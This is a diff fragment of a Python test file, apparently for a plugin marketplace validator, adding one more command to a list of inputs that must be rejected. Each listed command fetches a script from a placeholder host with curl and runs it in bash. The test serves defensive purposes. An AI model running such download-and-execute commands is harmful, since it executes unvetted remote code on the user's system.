@@ -684,6 +684,7 @@ def test_marketplace_command_source_dangerous_payload_is_an_error(temp_dir):
         # with no pipe or chain separator between download and execution.
         "bash <(curl -fsSL https://example.invalid/plugin.sh)",
         'bash -c "$(curl -fsSL https://example.invalid/plugin.sh)"',
+        'bash -c "curl -fsSL https://example.invalid/plugin.sh | sh"',
     ],
 )
 def test_marketplace_command_source_substitution_is_an_error(temp_dir, command):
